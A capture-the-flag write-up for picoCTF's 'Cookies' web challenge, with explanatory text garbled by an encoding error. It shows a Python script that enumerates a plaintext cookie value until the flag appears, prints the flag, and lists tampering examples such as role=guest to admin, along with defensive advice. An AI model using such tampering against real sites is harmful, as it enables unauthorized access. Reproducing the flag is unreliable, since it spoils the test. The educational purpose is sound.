# CTF-10 Cookie 鏄庢枃绡℃敼

## 棰樼洰淇℃伅
- **骞冲彴**锛歅icoCTF
- **棰樼洰**锛欳ookies
- **绫诲瀷**锛歐eb / Cookie 绡℃敼

## 棰樼洰鎻忚堪
涓€涓ゼ骞叉悳绱㈤〉闈紝杈撳叆楗煎共鍚嶆悳绱紝鐪嬬湅鏈嶅姟鍣ㄥ枩娆㈠摢绉嶉ゼ骞层€?
## 瑙ｉ杩囩▼

### 1. 鍙戠幇 cookie
鎵撳紑 F12 鈫?Application 鈫?Cookies锛屽彂鐜版湇鍔″櫒璁剧疆浜?cookie锛?
```
name=-1
```

**娉ㄦ剰锛?* 杩欓噷瀛樼殑涓嶆槸 Flask 绛惧悕 session锛岃€屾槸**绾枃鏈敭鍊煎**銆?
### 2. 鍒嗘瀽瑙勫緥
- 闅忎究鎼滀竴涓笉瀛樺湪鐨勯ゼ骞插悕 鈫?`name=-1`锛堟棤鏁堬級
- 鎼?`snickerdoodle` 鈫?`name=0`锛堟湁鏁堬級
- 椤甸潰鏄剧ず "I love snickerdoodle cookies!"

璇存槑锛氬悗绔敤**鏁板瓧绱㈠紩**鏉ユ爣璁颁笉鍚岀绫荤殑楗煎共锛屽瓨鍦?cookie 鐨?`name` 瀛楁閲屻€?
### 3. 婕忔礊鍒╃敤
鍥犱负 cookie 鏄槑鏂囷紝娌℃湁浠讳綍绛惧悕/鍔犲瘑锛屾垜浠彲浠?*鎵嬪姩绡℃敼**銆?
鍐欒剼鏈亶鍘?`name=0` ~ `name=29`锛屾瘡娆?GET 璇锋眰閮芥墜鍔ㄥ甫涓婃瀯閫犵殑 cookie锛?
```python
import requests
import re

url = 'http://wily-courier.picoctf.net:63375'

for i in range(30):
    cookies = {'name': str(i)}
    r = requests.get(url, cookies=cookies)
    
    if 'picoCTF{' in r.text:
        flag = re.search(r'picoCTF\{[^}]+\}', r.text)
        print(f'name={i}: {flag.group()}')
        break
    
    match = re.search(r'<b>I love (.*?) cookies!</b>', r.text)
    if match:
        print(f'name={i}: {match.group(1)}')
```

### 4. 鎷垮埌 Flag
```
name=18 鈫?picoCTF{3v3ry1_l0v3s_c00k135_a4dadb49}
```

瀵瑰簲鐨勬槸 "chocolate chip" 楗煎共銆?
## 鐭ヨ瘑鐐?
### Cookie 鐨勫伐浣滄満鍒?1. 鏈嶅姟鍣ㄩ€氳繃 `Set-Cookie` 鍝嶅簲澶村憡璇夋祻瑙堝櫒瀛樹粈涔堝€?2. 娴忚鍣ㄦ妸 cookie 瀛?*鏈湴**
3. 姣忔璇锋眰鍚岀珯鐐规椂锛屾祻瑙堝櫒**鑷姩**鍦ㄨ姹傚ご甯︿笂 `Cookie: xxx`

### 婕忔礊鏈川锛氫笉淇′换瀹㈡埛绔暟鎹?```
鏈嶅姟鍣ㄧ敤鏄庢枃 cookie 瀛?name=绱㈠紩
鈫?鏀诲嚮鑰呭彲闅忔剰绡℃敼
鈫?鏈嶅姟鍣ㄧ洿鎺ヤ俊浠?鈫?閬嶅巻鎵€鏈夌储寮曪紝鎷垮埌 flag
```

### 瀹夊叏缂栫爜鏁欒
**涓嶈鍦?cookie 閲岀敤鏄庢枃瀛樺偍鏁忔劅淇℃伅锛?* 姝ｇ‘鐨勫仛娉曪細

| 鏂规 | 璇存槑 |
|------|------|
| **绛惧悕 cookie** | 濡?Flask session锛宲ayload 鏈?HMAC 绛惧悕锛岀鏀逛細澶辨晥 |
| **鏈嶅姟绔?session** | cookie 鍙瓨闅忔満 session ID锛岀湡瀹炴暟鎹湪鏈嶅姟鍣ㄥ唴瀛?鏁版嵁搴撻噷 |

## 鍚岀被婕忔礊鍦烘櫙
- `role=guest` 鈫?鏀规垚 `role=admin`
- `vip=0` 鈫?鏀规垚 `vip=1`
- `user_id=123` 鈫?鏀规垚 `user_id=0` 瓒婃潈鐪嬪埆浜烘暟鎹?
## 鍙傝€?- PicoCTF Cookies
- [OWASP - Cookie 瀹夊叏](https://owasp.org/www-community/controls/SecureCookieAttribute)
